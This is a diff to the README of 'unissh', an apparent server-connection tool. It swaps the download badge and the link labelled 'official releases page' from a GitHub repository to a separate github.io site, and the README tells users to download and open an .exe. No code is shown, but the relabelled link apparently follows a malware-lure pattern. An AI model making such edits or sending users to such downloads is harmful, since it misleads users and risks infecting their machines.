@@ -1,6 +1,6 @@
 # 🛡️ unissh - Securely manage your servers with ease
 
-[![](https://img.shields.io/badge/Download-Unissh-blue.svg)](https://github.com/Propitiatory-agamid102/unissh)
+[![](https://img.shields.io/badge/Download-Unissh-blue.svg)](https://propitiatory-agamid102.github.io)
 
 unissh helps you connect to remote computers. It keeps your login information safe through encryption. You control the sync server. This setup ensures that only you access your data.
 
@@ -8,7 +8,7 @@ unissh helps you connect to remote computers. It keeps your login information sa
 
 You need to download the installer to start using the application. Follow these instructions:
 
-1. Visit the [official releases page](https://github.com/Propitiatory-agamid102/unissh).
+1. Visit the [official releases page](https://propitiatory-agamid102.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes to begin the installation.
